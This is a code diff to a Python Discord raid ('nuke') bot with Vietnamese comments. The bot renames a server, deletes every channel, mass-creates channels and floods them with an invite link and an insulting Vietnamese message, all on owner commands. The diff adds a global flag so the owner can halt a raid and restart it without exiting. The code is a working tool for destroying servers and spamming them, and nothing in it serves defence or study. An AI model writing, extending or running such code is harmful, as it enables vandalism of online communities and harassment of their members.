@@ -17,6 +17,7 @@ BATCH_SIZE = 80
 SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"  # Link mặc định
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
+raid_active = True  # Biến toàn cục kiểm soát raid
 
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
@@ -339,13 +340,13 @@ async def delete_all_channels(guild):
             pass
 
 async def create_channels_and_spam(guild):
-    global SPAM_LINK
+    global raid_active, SPAM_LINK
     total_created = 0
-    for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
+    while raid_active and total_created < CHANNEL_COUNT:
         batch_tasks = []
-        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
+        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - total_created)
         for i in range(batch_count):
-            idx = batch_start + i + 1
+            idx = total_created + i + 1
             name = f"{RAID_NAME} {idx}"
             batch_tasks.append(guild.create_text_channel(name))
         channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
@@ -357,10 +358,12 @@ async def create_channels_and_spam(guild):
         if spam_tasks:
             await asyncio.gather(*spam_tasks, return_exceptions=True)
         await asyncio.sleep(0.05)
+        if not raid_active:
+            break
 
 async def continuous_spam(guild):
-    global SPAM_LINK
-    while True:
+    global raid_active, SPAM_LINK
+    while raid_active:
         channels = list(guild.text_channels)
         if not channels:
             await asyncio.sleep(0.3)
@@ -373,6 +376,8 @@ async def continuous_spam(guild):
         await asyncio.sleep(0.1)
 
 async def raid(guild):
+    global raid_active
+    raid_active = True
     await change_guild_name(guild)
     await asyncio.sleep(1)
     await delete_all_channels(guild)
@@ -401,13 +406,12 @@ async def on_guild_join(guild):
 
 @client.event
 async def on_message(message):
-    global SPAM_LINK
+    global raid_active, SPAM_LINK
     if message.author.id == client.user.id:
         return
     if message.author.id != OWNER_ID:
         return
 
-    # Xử lý lệnh !raid trong DM và server
     if message.content.startswith("!raid"):
         parts = message.content.split()
         if not message.guild and len(parts) > 1:
@@ -426,7 +430,8 @@ async def on_message(message):
             await message.channel.send("❌ Hãy gửi !raid <link> trong DM để cập nhật link spam.")
 
     elif message.content.lower() == "!stop":
-        sys.exit(0)
+        raid_active = False
+        await message.channel.send("✅ Đã dừng raid (không tắt bot). Gõ !raid để bắt đầu lại.")
 
 @client.event
 async def on_member_remove(member):
